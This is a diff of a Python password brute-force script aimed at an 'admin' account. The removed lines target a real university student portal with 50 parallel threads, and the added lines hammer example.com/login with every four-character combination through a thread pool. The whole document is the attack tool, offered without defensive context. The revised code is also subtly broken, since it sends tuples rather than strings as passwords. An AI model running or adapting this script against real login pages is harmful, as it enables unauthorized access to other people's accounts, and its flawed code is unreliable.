@@ -1,52 +1,31 @@
 import requests
-import random
-from threading import Thread
-import os
+import itertools
+import concurrent.futures
+import string
 
-url = "https://eserver.kabarak.ac.ke/students/"
+# Define the URL
+url = 'http://example.com/login'
 
-#We assume you already have the username or email of the target person's account that you want to bruteforce
-email = 'admin'
+# The username to use for the brute force attack
+username = 'admin'
+
+# The characters to use in the brute force attack
+chars = string.ascii_letters + string.digits + string.punctuation
+
+def brute_force(password):
+    response = send_request(username, password)
+    if 'failed to login' not in response:
+        with open('correct_password.txt', 'a') as f:
+            f.write(password + '\n')
 
 def send_request(username, password):
     data = {
-        "username" : username,
-        "password" : password
+        'username': username,
+        'password': password
     }
+    response = requests.post(url, data=data)
+    return response.text
 
-    req = requests.get(url, data=data)
-    return req
-
-chars = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ[!@#$%^&*()-_+={};:,.<>/?|\`]"
-
-def main():
-    while True:
-        if "correct_password.txt" in os.listdir():
-            break
-        valid = False
-        while not valid:
-            randpwd = random.choices(chars, k=2)
-            pwd = "".join(randpwd)
-            file = open("tries.txt", 'r')
-            tries = file.read()
-            file.close()
-
-            if pwd in tries:
-                pass
-            else:
-                valid = True
-        req = send_request(username, pwd)
-
-        if 'failed to login' in req.text.lower():
-            with open("tries.txt", 'a') as f:
-                f.write(f"{pwd}\n")
-                f.close()
-            print(f"Incorrect {pwd}\n")
-        else:
-            print(f"Correct password {pwd}!\n")
-            with open("correct_password.txt", "w") as f:
-                f.write(pwd)
-                break
-
-for x in range(50):
-    Thread(target=main).start()
+# Use a thread pool to parallelize the requests
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    executor.map(brute_force, itertools.product(chars, repeat=4))
